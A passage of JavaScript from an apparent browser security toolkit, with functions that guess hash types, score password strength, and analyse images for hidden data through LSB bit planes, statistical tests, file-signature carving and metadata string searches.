    const charset = /^[a-f0-9]+$/i.test(hash) ? 'Hexadecimal' : 'Mixed';
    
    let types = [];
    let confidence = 'Unknown';

    if (charset === 'Hexadecimal') {
        switch(length) {
            case 32:
                types = ['MD5', 'MD4', 'MD2', 'NTLM'];
                confidence = 'High';
                break;
            case 40:
                types = ['SHA-1', 'MySQL5', 'Tiger-160'];
                confidence = 'High';
                break;
            case 56:
                types = ['SHA-224', 'SHA3-224'];
                confidence = 'Medium';
                break;
            case 64:
                types = ['SHA-256', 'SHA3-256', 'BLAKE2s'];
                confidence = 'High';
                break;
            case 96:
                types = ['SHA-384', 'SHA3-384'];
                confidence = 'Medium';
                break;
            case 128:
                types = ['SHA-512', 'SHA3-512', 'BLAKE2b'];
                confidence = 'High';
                break;
            default:
                types = ['Unknown format'];
                confidence = 'Low';
        }
    } else {
        types = ['Base64 encoded', 'Custom encoding', 'Salted hash'];
        confidence = 'Low';
    }

    return { types, confidence };
}

function getAlternativeHashTypes(hash) {
    const length = hash.length;
    const alternatives = [];

    switch(length) {
        case 32:
            alternatives.push('MD5', 'MD4', 'NTLM');
            break;
        case 40:
            alternatives.push('SHA-1', 'MySQL5');
            break;
        case 64:
            alternatives.push('SHA-256', 'SHA3-256');
            break;
        case 128:
            alternatives.push('SHA-512', 'SHA3-512');
            break;
    }

    return alternatives.length > 0 ? alternatives : ['MD5', 'SHA-1', 'SHA-256'];
}

function analyzePassword(password) {
    let analysis = '';
    
    // Length analysis
    if (password.length < 8) {
        analysis += `⚠️ Length: ${password.length} characters (WEAK - too short)\n`;
    } else if (password.length < 12) {
        analysis += `⚡ Length: ${password.length} characters (MODERATE)\n`;
    } else {
        analysis += `✅ Length: ${password.length} characters (GOOD)\n`;
    }
    
    // Character set analysis
    const hasLower = /[a-z]/.test(password);
    const hasUpper = /[A-Z]/.test(password);
    const hasDigits = /\d/.test(password);
    const hasSpecial = /[!@#$%^&*(),.?":{}|<>]/.test(password);
    
    let charTypes = 0;
    if (hasLower) charTypes++;
    if (hasUpper) charTypes++;
    if (hasDigits) charTypes++;
    if (hasSpecial) charTypes++;
    
    analysis += `Character types: ${charTypes}/4 (`;
    if (hasLower) analysis += 'lowercase ';
    if (hasUpper) analysis += 'uppercase ';
    if (hasDigits) analysis += 'digits ';
    if (hasSpecial) analysis += 'special ';
    analysis += ')\n';
    
    // Common patterns
    if (/^[a-zA-Z]+$/.test(password)) {
        analysis += `⚠️ Pattern: Letters only (WEAK)\n`;
    } else if (/^\d+$/.test(password)) {
        analysis += `⚠️ Pattern: Numbers only (VERY WEAK)\n`;
    } else if (/^[a-zA-Z]+\d+$/.test(password)) {
        analysis += `⚠️ Pattern: Letters followed by numbers (COMMON)\n`;
    }
    
    // Dictionary word check
    const commonWords = ['password', 'admin', 'user', 'test', 'guest', 'root', 'love', 'secret'];
    const lowerPassword = password.toLowerCase();
    for (let word of commonWords) {
        if (lowerPassword.includes(word)) {
            analysis += `⚠️ Contains common word: "${word}" (VULNERABLE)\n`;
            break;
        }
    }
    
    // Overall strength
    let strength = 'VERY WEAK';
    if (charTypes >= 3 && password.length >= 8) strength = 'MODERATE';
    if (charTypes >= 4 && password.length >= 10) strength = 'GOOD';
    if (charTypes >= 4 && password.length >= 14) strength = 'STRONG';
    
    analysis += `Overall Strength: ${strength}\n`;
    
    return analysis;
}

// Steganography functions
function analyzeSteganography() {
    const fileInput = document.getElementById('stegoImage');
    const analysisType = document.getElementById('stegoType').value;
    const output = document.getElementById('stegoOutput');
    const canvasContainer = document.getElementById('stegoCanvas');

    if (!fileInput.files[0]) {
        showMessage('Please upload an image', 'error');
        return;
    }

    const file = fileInput.files[0];
    const reader = new FileReader();

    reader.onload = function(e) {
        const img = new Image();
        img.onload = function() {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');
            canvas.width = img.width;
            canvas.height = img.height;
            ctx.drawImage(img, 0, 0);

            let result = `<strong>Advanced Steganography Analysis - ${analysisType.toUpperCase()}</strong>\n\n`;
            result += `<strong>File Information:</strong>\n`;
            result += `Filename: ${file.name}\n`;
            result += `File Size: ${file.size.toLocaleString()} bytes (${(file.size / 1024).toFixed(2)} KB)\n`;
            result += `Image Dimensions: ${img.width} x ${img.height} pixels\n`;
            result += `Total Pixels: ${(img.width * img.height).toLocaleString()}\n`;
            result += `Color Depth: 24-bit (RGB)\n`;
            result += `Analysis Time: ${new Date().toLocaleString()}\n\n`;

            switch(analysisType) {
                case 'lsb':
                    result += performAdvancedLSBAnalysis(ctx, canvas.width, canvas.height, canvasContainer);
                    break;
                case 'metadata':
                    result += performMetadataAnalysis(file, e.target.result);
                    break;
                case 'strings':
                    result += performStringExtraction(e.target.result);
                    break;
                case 'visual':
                    result += performVisualAnalysis(ctx, canvas.width, canvas.height, canvasContainer);
                    break;
            }

            output.innerHTML = `<pre>${result}</pre>`;
            showMessage('Steganography analysis completed!', 'success');
        };
        img.src = e.target.result;
    };
    reader.readAsDataURL(file);
}

function performAdvancedLSBAnalysis(ctx, width, height, canvasContainer) {
    const imageData = ctx.getImageData(0, 0, width, height);
    const data = imageData.data;
    let result = `<strong>Advanced LSB (Least Significant Bit) Analysis:</strong>\n\n`;

    // Extract LSBs from each color channel and bit planes
    const channels = {
        red: { lsbs: [], planes: [] },
        green: { lsbs: [], planes: [] },
        blue: { lsbs: [], planes: [] },
        alpha: { lsbs: [], planes: [] }
    };

    // Extract multiple bit planes (LSB, 2nd LSB, etc.)
    for (let plane = 0; plane < 4; plane++) {
        channels.red.planes[plane] = [];
        channels.green.planes[plane] = [];
        channels.blue.planes[plane] = [];
        channels.alpha.planes[plane] = [];
    }

    for (let i = 0; i < data.length; i += 4) {
        // Extract bit planes for each channel
        for (let plane = 0; plane < 4; plane++) {
            channels.red.planes[plane].push((data[i] >> plane) & 1);
            channels.green.planes[plane].push((data[i + 1] >> plane) & 1);
            channels.blue.planes[plane].push((data[i + 2] >> plane) & 1);
            if (data[i + 3] !== undefined) {
                channels.alpha.planes[plane].push((data[i + 3] >> plane) & 1);
            }
        }
        
        // LSBs for backward compatibility
        channels.red.lsbs.push(data[i] & 1);
        channels.green.lsbs.push(data[i + 1] & 1);
        channels.blue.lsbs.push(data[i + 2] & 1);
        if (data[i + 3] !== undefined) {
            channels.alpha.lsbs.push(data[i + 3] & 1);
        }
    }

    // Analyze bit patterns
    result += `<strong>Bit Plane Extraction Results:</strong>\n`;
    result += `Image Dimensions: ${width} x ${height}\n`;
    result += `Total Pixels: ${width * height}\n`;
    result += `Total Bits Available per Plane: ${channels.red.lsbs.length} bits (${Math.floor(channels.red.lsbs.length / 8)} bytes)\n`;
    result += `Total Capacity (RGB LSB): ${channels.red.lsbs.length * 3} bits (${Math.floor(channels.red.lsbs.length * 3 / 8)} bytes)\n\n`;

    // Analyze each bit plane for all channels
    result += `<strong>Bit Plane Analysis:</strong>\n`;
    ['red', 'green', 'blue'].forEach(channelName => {
        result += `${channelName.toUpperCase()} Channel:\n`;
        for (let plane = 0; plane < 4; plane++) {
            const entropy = calculateBitEntropy(channels[channelName].planes[plane], `Bit Plane ${plane}`);
            const chi2 = calculateChiSquare(channels[channelName].planes[plane]);
            result += `  Plane ${plane}: Entropy=${entropy.split('=')[1].split(' ')[0]}, χ²=${chi2.toFixed(4)}\n`;
        }
    });
    result += '\n';

    // Convert bits to potential hidden data
    result += `<strong>Hidden Data Extraction:</strong>\n`;
    
    // Try different extraction methods
    const extractionMethods = [
        { name: 'Red LSB Sequential', bits: channels.red.lsbs },
        { name: 'Green LSB Sequential', bits: channels.green.lsbs },
        { name: 'Blue LSB Sequential', bits: channels.blue.lsbs },
        { name: 'RGB LSB Interleaved', bits: interleaveBits([channels.red.lsbs, channels.green.lsbs, channels.blue.lsbs]) },
        { name: 'Red 2nd Bit Plane', bits: channels.red.planes[1] },
        { name: 'Green 2nd Bit Plane', bits: channels.green.planes[1] }
    ];

    extractionMethods.forEach(method => {
        const extractedText = extractTextFromBits(method.bits);
        const extractedHex = extractHexFromBits(method.bits);
        
        if (extractedText && hasValidText(extractedText)) {
            result += `${method.name} Text: ${extractedText.substring(0, 200)}${extractedText.length > 200 ? '...' : ''}\n`;
        }
        
        // Check for file signatures in hex
        const fileType = detectFileTypeFromBits(method.bits);
        if (fileType) {
            result += `${method.name}: Possible ${fileType} file detected!\n`;
        }
    });

    // Advanced statistical analysis
    result += `\n<strong>Advanced Statistical Analysis:</strong>\n`;
    const rgbCombined = [...channels.red.lsbs, ...channels.green.lsbs, ...channels.blue.lsbs];
    result += calculateAdvancedStats(rgbCombined);

    // Frequency analysis
    result += `\n<strong>Frequency Analysis:</strong>\n`;
    result += performFrequencyAnalysis(channels);

    // Pattern detection
    result += `\n<strong>Pattern Detection:</strong>\n`;
    result += detectSteganographyPatterns(channels);

    // Create comprehensive visualizations
    createAdvancedLSBVisualization(channels, width, height, canvasContainer);
    result += `\n<strong>Visualizations:</strong> Multiple analysis views displayed below.\n`;

    // File carving attempt
    result += `\n<strong>File Carving Results:</strong>\n`;
    result += attemptFileCarving(rgbCombined);

    return result;
}

// Interleave bits from multiple channels
function interleaveBits(channelArrays) {
    const result = [];
    const maxLength = Math.max(...channelArrays.map(arr => arr.length));
    
    for (let i = 0; i < maxLength; i++) {
        channelArrays.forEach(channel => {
            if (i < channel.length) {
                result.push(channel[i]);
            }
        });
    }
    
    return result;
}

// Enhanced text extraction with better filtering
function extractTextFromBits(bits) {
    let text = '';
    let validCharCount = 0;
    let totalChars = 0;
    
    for (let i = 0; i < bits.length - 7; i += 8) {
        const byte = bits.slice(i, i + 8).join('');
        const charCode = parseInt(byte, 2);
        totalChars++;
        
        if (charCode >= 32 && charCode <= 126) {
            text += String.fromCharCode(charCode);
            validCharCount++;
        } else if (charCode === 10 || charCode === 13 || charCode === 9) {
            text += String.fromCharCode(charCode);
            validCharCount++;
        } else if (charCode === 0) {
            text += '\0';
        } else {
            text += '.';
        }
    }
    
    // Return text only if it has a reasonable ratio of valid characters
    return (validCharCount / totalChars) > 0.7 ? text : '';
}

// Extract hex representation
function extractHexFromBits(bits) {
    let hex = '';
    for (let i = 0; i < bits.length - 7; i += 8) {
        const byte = bits.slice(i, i + 8).join('');
        const value = parseInt(byte, 2);
        hex += value.toString(16).padStart(2, '0');
    }
    return hex;
}

// Check if text contains valid readable content
function hasValidText(text) {
    if (!text || text.length < 10) return false;
    
    const printableChars = text.replace(/[\x00-\x1F\x7F-\x9F]/g, '').length;
    const ratio = printableChars / text.length;
    
    // Check for common words or patterns
    const commonWords = ['the', 'and', 'for', 'are', 'but', 'not', 'you', 'all', 'can', 'had', 'her', 'was', 'one'];
    const hasCommonWords = commonWords.some(word => text.toLowerCase().includes(word));
    
    return ratio > 0.8 || hasCommonWords;
}

// Calculate chi-square test for randomness
function calculateChiSquare(bits) {
    const ones = bits.filter(bit => bit === 1).length;
    const zeros = bits.length - ones;
    const expected = bits.length / 2;
    
    const chiSquare = Math.pow(ones - expected, 2) / expected + 
                     Math.pow(zeros - expected, 2) / expected;
    
    return chiSquare;
}

// Detect file type from bit patterns
function detectFileTypeFromBits(bits) {
    const hex = extractHexFromBits(bits.slice(0, 64)); // First 8 bytes
    
    const signatures = {
        '89504e470d0a1a0a': 'PNG',
        'ffd8ff': 'JPEG',
        '474946383761': 'GIF87a',
        '474946383961': 'GIF89a',
        '504b0304': 'ZIP',
        '504b0506': 'ZIP (empty)',
        '504b0708': 'ZIP (spanned)',
        '526172211a0700': 'RAR v1.5+',
        '526172211a070100': 'RAR v5.0+',
        '25504446': 'PDF',
        'd0cf11e0a1b11ae1': 'Microsoft Office',
        '4d5a': 'Windows PE',
        '7f454c46': 'Linux ELF',
        'cafebabe': 'Java Class',
        'feedface': 'Mach-O Binary (32-bit)',
        'feedfacf': 'Mach-O Binary (64-bit)',
        'cefaedfe': 'Mach-O Binary (reverse 32-bit)',
        'cffaedfe': 'Mach-O Binary (reverse 64-bit)'
    };
    
    for (const [sig, type] of Object.entries(signatures)) {
        if (hex.toLowerCase().startsWith(sig.toLowerCase())) {
            return type;
        }
    }
    
    return null;
}

// Calculate advanced statistics
function calculateAdvancedStats(bits) {
    let result = '';
    
    // Basic stats
    const ones = bits.filter(bit => bit === 1).length;
    const zeros = bits.length - ones;
    const ratio = ones / bits.length;
    
    result += `Bit distribution: ${ones} ones, ${zeros} zeros\n`;
    result += `Ones ratio: ${ratio.toFixed(4)} (expected: 0.5000)\n`;
    
    // Runs test for randomness
    let runs = 1;
    for (let i = 1; i < bits.length; i++) {
        if (bits[i] !== bits[i-1]) runs++;
    }
    
    const expectedRuns = (2 * ones * zeros) / bits.length + 1;
    const runsZ = Math.abs(runs - expectedRuns) / Math.sqrt((expectedRuns - 1) * (expectedRuns - 2) / (bits.length - 1));
    
    result += `Runs test: ${runs} runs (expected: ${expectedRuns.toFixed(2)}, Z-score: ${runsZ.toFixed(4)})\n`;
    
    // Serial correlation
    let correlation = 0;
    for (let i = 0; i < bits.length - 1; i++) {
        correlation += bits[i] * bits[i + 1];
    }
    correlation = (correlation / (bits.length - 1)) - (ratio * ratio);
    
    result += `Serial correlation: ${correlation.toFixed(6)} (closer to 0 = more random)\n`;
    
    return result;
}

// Perform frequency analysis on bit patterns
function performFrequencyAnalysis(channels) {
    let result = '';
    
    // Analyze 2-bit, 4-bit, and 8-bit patterns
    const patternSizes = [2, 4, 8];
    
    patternSizes.forEach(size => {
        result += `${size}-bit pattern frequency:\n`;
        
        ['red', 'green', 'blue'].forEach(channelName => {
            const bits = channels[channelName].lsbs;
            const patterns = {};
            
            for (let i = 0; i <= bits.length - size; i++) {
                const pattern = bits.slice(i, i + size).join('');
                patterns[pattern] = (patterns[pattern] || 0) + 1;
            }
            
            // Find most and least common patterns
            const sortedPatterns = Object.entries(patterns).sort((a, b) => b[1] - a[1]);
            const total = Object.values(patterns).reduce((sum, count) => sum + count, 0);
            
            if (sortedPatterns.length > 0) {
                const mostCommon = sortedPatterns[0];
                const leastCommon = sortedPatterns[sortedPatterns.length - 1];
                const expectedFreq = total / Math.pow(2, size);
                
                result += `  ${channelName}: Most common: ${mostCommon[0]} (${mostCommon[1]}/${total}, expected: ${expectedFreq.toFixed(1)})\n`;
            }
        });
        result += '\n';
    });
    
    return result;
}

// Detect steganography patterns
function detectSteganographyPatterns(channels) {
    let result = '';
    let suspiciousPatterns = 0;
    
    // Check for LSB embedding indicators
    ['red', 'green', 'blue'].forEach(channelName => {
        const lsbs = channels[channelName].lsbs;
        
        // Chi-square test
        const chiSquare = calculateChiSquare(lsbs);
        if (chiSquare > 3.84) { // 95% confidence threshold
            result += `⚠️ ${channelName} channel LSB fails chi-square test (χ²=${chiSquare.toFixed(4)})\n`;
            suspiciousPatterns++;
        }
        
        // Check for unusual entropy
        const entropy = calculateChannelEntropy(lsbs.map(bit => bit * 255));
        if (entropy < 0.9 || entropy > 0.99) {
            result += `⚠️ ${channelName} channel has unusual entropy (${entropy.toFixed(4)})\n`;
            suspiciousPatterns++;
        }
        
        // Check for sequential patterns
        const sequentialRuns = countSequentialRuns(lsbs);
        if (sequentialRuns.maxRun > Math.sqrt(lsbs.length)) {
            result += `⚠️ ${channelName} channel has long sequential runs (max: ${sequentialRuns.maxRun})\n`;
            suspiciousPatterns++;
        }
    });
    
    // Overall assessment
    if (suspiciousPatterns === 0) {
        result += '✅ No obvious steganography patterns detected\n';
    } else if (suspiciousPatterns < 3) {
        result += `🔍 Some anomalies detected (${suspiciousPatterns} indicators)\n`;
    } else {
        result += `🚨 High probability of steganography (${suspiciousPatterns} indicators)\n`;
    }
    
    return result;
}

// Count sequential runs in bit array
function countSequentialRuns(bits) {
    let maxRun = 1;
    let currentRun = 1;
    let totalRuns = 1;
    
    for (let i = 1; i < bits.length; i++) {
        if (bits[i] === bits[i-1]) {
            currentRun++;
        } else {
            maxRun = Math.max(maxRun, currentRun);
            currentRun = 1;
            totalRuns++;
        }
    }
    
    return { maxRun, totalRuns, avgRun: bits.length / totalRuns };
}

// Attempt to carve files from bit data
function attemptFileCarving(bits) {
    let result = '';
    const minFileSize = 100; // Minimum 100 bytes for a valid file
    
    // Common file signatures to search for
    const signatures = [
        { name: 'PNG', hex: '89504e470d0a1a0a', footer: '49454e44ae426082' },
        { name: 'JPEG', hex: 'ffd8ff', footer: 'ffd9' },
        { name: 'GIF', hex: '474946383761', footer: '003b' },
        { name: 'ZIP', hex: '504b0304', footer: '504b0506' },
        { name: 'PDF', hex: '25504446', footer: '2525454f46' }
    ];
    
    let filesFound = 0;
    
    signatures.forEach(sig => {
        const headerPattern = sig.hex.match(/.{2}/g).map(hex => parseInt(hex, 16));
        const startPositions = findPatternInBits(bits, headerPattern);
        
        startPositions.forEach(startPos => {
            // Look for footer if available
            let endPos = startPos + minFileSize * 8;
            if (sig.footer) {
                const footerPattern = sig.footer.match(/.{2}/g).map(hex => parseInt(hex, 16));
                const footerPos = findPatternInBits(bits.slice(startPos), footerPattern);
                if (footerPos.length > 0) {
                    endPos = startPos + footerPos[0] + footerPattern.length * 8;
                }
            }
            
            const fileSize = Math.floor((endPos - startPos) / 8);
            if (fileSize >= minFileSize) {
                result += `${sig.name} file found: offset ${Math.floor(startPos/8)}, size ${fileSize} bytes\n`;
                filesFound++;
            }
        });
    });
    
    if (filesFound === 0) {
        result += 'No embedded files detected with standard signatures\n';
    } else {
        result += `\nTotal files detected: ${filesFound}\n`;
        result += 'Note: Use specialized tools like binwalk for extraction\n';
    }
    
    return result;
}

// Find byte pattern in bit array
function findPatternInBits(bits, bytePattern) {
    const positions = [];
    
    for (let i = 0; i <= bits.length - bytePattern.length * 8; i += 8) {
        let match = true;
        for (let j = 0; j < bytePattern.length; j++) {
            const byteBits = bits.slice(i + j * 8, i + (j + 1) * 8);
            const byteValue = parseInt(byteBits.join(''), 2);
            if (byteValue !== bytePattern[j]) {
                match = false;
                break;
            }
        }
        if (match) {
            positions.push(i);
        }
    }
    
    return positions;
}

// Create advanced LSB visualizations
function createAdvancedLSBVisualization(channels, width, height, container) {
    container.innerHTML = '';
    
    // Create multiple visualization canvases
    const visualizations = [
        { name: 'LSB Bit Planes (RGB)', type: 'lsb' },
        { name: '2nd Bit Planes (RGB)', type: 'plane2' },
        { name: 'Statistical Analysis', type: 'stats' },
        { name: 'Frequency Distribution', type: 'frequency' }
    ];
    
    visualizations.forEach(viz => {
        const title = document.createElement('h4');
        title.textContent = viz.name;
        title.style.color = '#ffffff';
        title.style.marginTop = '1rem';
        title.style.marginBottom = '0.5rem';
        
        const canvas = document.createElement('canvas');
        canvas.width = width;
        canvas.height = height;
        canvas.style.maxWidth = '100%';
        canvas.style.border = '1px solid #444';
        canvas.style.marginBottom = '1rem';
        canvas.style.background = '#000';
        
        const ctx = canvas.getContext('2d');
        
        switch(viz.type) {
            case 'lsb':
                drawBitPlaneVisualization(ctx, channels, width, height, 0);
                break;
            case 'plane2':
                drawBitPlaneVisualization(ctx, channels, width, height, 1);
                break;
            case 'stats':
                drawStatisticalVisualization(ctx, channels, width, height);
                break;
            case 'frequency':
                drawFrequencyVisualization(ctx, channels, width, height);
                break;
        }
        
        container.appendChild(title);
        container.appendChild(canvas);
    });
}

// Draw bit plane visualization
function drawBitPlaneVisualization(ctx, channels, width, height, plane) {
    const imageData = ctx.createImageData(width, height);
    const data = imageData.data;
    
    for (let i = 0; i < channels.red.planes[plane].length; i++) {
        const pixelIndex = i * 4;
        data[pixelIndex] = channels.red.planes[plane][i] * 255;     // Red
        data[pixelIndex + 1] = channels.green.planes[plane][i] * 255; // Green
        data[pixelIndex + 2] = channels.blue.planes[plane][i] * 255;  // Blue
        data[pixelIndex + 3] = 255;                                   // Alpha
    }
    
    ctx.putImageData(imageData, 0, 0);
}

// Draw statistical visualization
function drawStatisticalVisualization(ctx, channels, width, height) {
    ctx.fillStyle = '#000';
    ctx.fillRect(0, 0, width, height);
    
    // Draw entropy levels as colored bars
    const barHeight = height / 3;
    const channelNames = ['red', 'green', 'blue'];
    
    channelNames.forEach((channelName, index) => {
        const entropy = calculateChannelEntropy(channels[channelName].lsbs.map(bit => bit * 255));
        const normalizedEntropy = entropy / 8; // Normalize to 0-1
        
        // Color based on entropy level
        let color;
        if (normalizedEntropy < 0.7) color = '#ff4444'; // Low entropy - red
        else if (normalizedEntropy > 0.95) color = '#44ff44'; // High entropy - green
        else color = '#ffff44'; // Medium entropy - yellow
        
        ctx.fillStyle = color;
        ctx.fillRect(0, index * barHeight, width * normalizedEntropy, barHeight - 5);
        
        // Add text labels
        ctx.fillStyle = '#fff';
        ctx.font = '14px Arial';
        ctx.fillText(`${channelName.toUpperCase()}: ${entropy.toFixed(3)}`, 10, index * barHeight + 20);
    });
}

// Draw frequency visualization
function drawFrequencyVisualization(ctx, channels, width, height) {
    ctx.fillStyle = '#000';
    ctx.fillRect(0, 0, width, height);
    
    const barWidth = width / 256;
    const maxHeight = height - 40;
    
    // Analyze byte frequency for each channel
    const channelNames = ['red', 'green', 'blue'];
    const colors = ['#ff0000', '#00ff00', '#0000ff'];
    
    channelNames.forEach((channelName, channelIndex) => {
        const bits = channels[channelName].lsbs;
        const frequency = new Array(256).fill(0);
        
        // Count byte frequencies
        for (let i = 0; i < bits.length - 7; i += 8) {
            const byte = bits.slice(i, i + 8).join('');
            const value = parseInt(byte, 2);
            frequency[value]++;
        }
        
        const maxFreq = Math.max(...frequency);
        
        // Draw frequency bars with transparency
        ctx.globalAlpha = 0.5;
        ctx.fillStyle = colors[channelIndex];
        
        for (let i = 0; i < 256; i++) {
            const barHeight = (frequency[i] / maxFreq) * maxHeight;
            ctx.fillRect(i * barWidth, height - barHeight - 20, barWidth - 1, barHeight);
        }
    });
    
    ctx.globalAlpha = 1.0;
    
    // Add axis labels
    ctx.fillStyle = '#fff';
    ctx.font = '10px Arial';
    ctx.fillText('0', 0, height - 5);
    ctx.fillText('255', width - 20, height - 5);
    ctx.fillText('Byte Value', width / 2 - 30, height - 5);
}

function extractTextFromBits(bits) {
    let text = '';
    for (let i = 0; i < bits.length - 7; i += 8) {
        const byte = bits.slice(i, i + 8).join('');
        const charCode = parseInt(byte, 2);
        if (charCode >= 32 && charCode <= 126) {
            text += String.fromCharCode(charCode);
        } else if (charCode === 10 || charCode === 13) {
            text += '\n';
        } else {
            text += '.';
        }
    }
    return text;
}

function calculateBitEntropy(bits, channelName) {
    const ones = bits.filter(bit => bit === 1).length;
    const zeros = bits.length - ones;
    const total = bits.length;
    
    if (ones === 0 || zeros === 0) {
        return `${channelName}: Entropy = 0.0000 (all bits are ${ones === 0 ? '0' : '1'})\n`;
    }
    
    const p1 = ones / total;
    const p0 = zeros / total;
    const entropy = -(p1 * Math.log2(p1) + p0 * Math.log2(p0));
    
    let analysis = '';
    if (entropy < 0.1) {
        analysis = 'Very low entropy - likely no hidden data';
    } else if (entropy < 0.5) {
        analysis = 'Low entropy - possible simple pattern';
    } else if (entropy > 0.9) {
        analysis = 'High entropy - possible encrypted/compressed data';
    } else {
        analysis = 'Medium entropy - possible hidden data';
    }
    
    return `${channelName}: Entropy = ${entropy.toFixed(4)} (${analysis})\n`;
}

function createLSBVisualization(redLSBs, greenLSBs, blueLSBs, width, height, container) {
    container.innerHTML = '';
    
    const canvas = document.createElement('canvas');
    canvas.width = width;
    canvas.height = height;
    canvas.style.maxWidth = '100%';
    canvas.style.border = '1px solid #ccc';
    canvas.style.marginTop = '10px';
    
    const ctx = canvas.getContext('2d');
    const imageData = ctx.createImageData(width, height);
    const data = imageData.data;
    
    // Create LSB visualization - each channel's LSB becomes full intensity
    for (let i = 0; i < redLSBs.length; i++) {
        const pixelIndex = i * 4;
        data[pixelIndex] = redLSBs[i] * 255;     // Red
        data[pixelIndex + 1] = greenLSBs[i] * 255; // Green
        data[pixelIndex + 2] = blueLSBs[i] * 255;  // Blue
        data[pixelIndex + 3] = 255;              // Alpha
    }
    
    ctx.putImageData(imageData, 0, 0);
    
    const title = document.createElement('h4');
    title.textContent = 'LSB Bit Pattern Visualization';
    title.style.color = '#ffffff';
    title.style.marginTop = '1rem';
    
    container.appendChild(title);
    container.appendChild(canvas);
}

function detectFileHeaders(bits) {
    const headers = {
        'PNG': '89504E47',
        'JPEG': 'FFD8FF',
        'GIF': '47494638',
        'PDF': '25504446',
        'ZIP': '504B0304',
        'RAR': '526172211A07',
        'BMP': '424D',
        'TIFF': '49492A00',
        'MP3': 'ID3',
        'MP4': '66747970',
        'AVI': '52494646',
        'EXE': '4D5A',
        'ELF': '7F454C46'
    };
    
    let result = '';
    const hexString = bitsToHex(bits.slice(0, 128)); // Check first 16 bytes
    
    for (const [format, header] of Object.entries(headers)) {
        if (hexString.toUpperCase().startsWith(header)) {
            result += `🎯 Possible ${format} file detected at start of LSB data!\n`;
        }
    }
    
    if (result === '') {
        result += 'No common file headers detected in LSB data.\n';
    }
    
    return result;
}

function bitsToHex(bits) {
    let hex = '';
    for (let i = 0; i < bits.length - 3; i += 4) {
        const nibble = bits.slice(i, i + 4).join('');
        hex += parseInt(nibble, 2).toString(16);
    }
    return hex;
}

function performMetadataAnalysis(file, dataUrl) {
    let result = `<strong>Metadata Analysis:</strong>\n\n`;
    
    // Basic file information
    result += `<strong>File Properties:</strong>\n`;
    result += `MIME Type: ${file.type}\n`;
    result += `Last Modified: ${new Date(file.lastModified).toLocaleString()}\n`;
    result += `File Size: ${file.size} bytes\n\n`;
    
    // Analyze data URL for embedded metadata
    if (dataUrl.includes('data:image/jpeg')) {
        result += `<strong>JPEG Analysis:</strong>\n`;
        result += analyzeJPEGMetadata(dataUrl);
    } else if (dataUrl.includes('data:image/png')) {
        result += `<strong>PNG Analysis:</strong>\n`;
        result += analyzePNGMetadata(dataUrl);
    } else {
        result += `Image format: ${file.type}\n`;
        result += `Note: Limited metadata analysis available for this format.\n`;
    }
    
    // Look for embedded data in the file
    result += `\n<strong>Embedded Data Search:</strong>\n`;
    const base64Data = dataUrl.split(',')[1];
    if (base64Data) {
        try {
            const binaryString = atob(base64Data);
            result += searchForEmbeddedStrings(binaryString);
        } catch (e) {
            result += `Error decoding base64 data: ${e.message}\n`;
        }
    }
    
    return result;
}

function analyzeJPEGMetadata(dataUrl) {
    let result = 'JPEG files may contain EXIF data with:\n';
    result += '• Camera make and model\n';
    result += '• GPS coordinates\n';
    result += '• Date and time taken\n';
    result += '• Camera settings\n';
    result += '• Software used\n\n';
    
    // Basic JPEG structure analysis
    const base64Data = dataUrl.split(',')[1];
    if (base64Data) {
        try {
            const binaryString = atob(base64Data);
            const uint8Array = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                uint8Array[i] = binaryString.charCodeAt(i);
            }
            
            // Look for EXIF marker
            if (findSequence(uint8Array, [0xFF, 0xE1])) {
                result += '✅ EXIF data marker found\n';
            } else {
                result += '❌ No EXIF data marker found\n';
            }
            
            // Look for comment marker
            if (findSequence(uint8Array, [0xFF, 0xFE])) {
                result += '✅ Comment section found\n';
            } else {
                result += '❌ No comment section found\n';
            }
            
        } catch (e) {
            result += `Error analyzing JPEG structure: ${e.message}\n`;
        }
    }
    
    return result;
}

function analyzePNGMetadata(dataUrl) {
    let result = 'PNG files may contain:\n';
    result += '• Creation software information\n';
    result += '• Text chunks with embedded data\n';
    result += '• Color profile information\n';
    result += '• Modification history\n\n';
    
    // Basic PNG structure analysis
    const base64Data = dataUrl.split(',')[1];
    if (base64Data) {
        try {
            const binaryString = atob(base64Data);
            const uint8Array = new Uint8Array(binaryString.length);
            for (let i = 0; i < binaryString.length; i++) {
                uint8Array[i] = binaryString.charCodeAt(i);
            }
            
            // Look for PNG signature
            if (uint8Array[0] === 0x89 && uint8Array[1] === 0x50 && 
                uint8Array[2] === 0x4E && uint8Array[3] === 0x47) {
                result += '✅ Valid PNG signature found\n';
            }
            
            // Look for text chunks
            const textChunks = findPNGTextChunks(uint8Array);
            if (textChunks.length > 0) {
                result += `✅ Found ${textChunks.length} text chunk(s):\n`;
                textChunks.forEach((chunk, index) => {
                    result += `  ${index + 1}. ${chunk}\n`;
                });
            } else {
                result += '❌ No text chunks found\n';
            }
            
        } catch (e) {
            result += `Error analyzing PNG structure: ${e.message}\n`;
        }
    }
    
    return result;
}

function findSequence(array, sequence) {
    for (let i = 0; i <= array.length - sequence.length; i++) {
        let match = true;
        for (let j = 0; j < sequence.length; j++) {
            if (array[i + j] !== sequence[j]) {
                match = false;
                break;
            }
        }
        if (match) return true;
    }
    return false;
}

function findPNGTextChunks(data) {
    const chunks = [];
    const textTypes = ['tEXt', 'zTXt', 'iTXt'];
    
    for (let type of textTypes) {
        const typeBytes = Array.from(type).map(c => c.charCodeAt(0));
        for (let i = 0; i < data.length - 4; i++) {
            if (data[i] === typeBytes[0] && data[i + 1] === typeBytes[1] && 
                data[i + 2] === typeBytes[2] && data[i + 3] === typeBytes[3]) {
                chunks.push(`${type} chunk at offset ${i}`);
            }
        }
    }
    
    return chunks;
}

function searchForEmbeddedStrings(binaryString) {
    let result = '';
    const minLength = 8;
    const strings = [];
    let currentString = '';
    
    for (let i = 0; i < binaryString.length; i++) {
        const char = binaryString.charAt(i);
        const code = char.charCodeAt(0);
        
        if (code >= 32 && code <= 126) {
            currentString += char;
        } else {
            if (currentString.length >= minLength) {
                strings.push(currentString);
            }
            currentString = '';
        }
    }
    
    if (currentString.length >= minLength) {
        strings.push(currentString);
    }
    
    if (strings.length > 0) {
        result += `Found ${strings.length} readable string(s):\n`;
        strings.slice(0, 10).forEach((str, index) => {
            result += `${index + 1}. ${str.length > 50 ? str.substring(0, 50) + '...' : str}\n`;
        });
        if (strings.length > 10) {
            result += `... and ${strings.length - 10} more strings\n`;
        }
    } else {
        result += 'No readable strings found in file data.\n';
    }
    
    return result;
}

function performStringExtraction(dataUrl) {
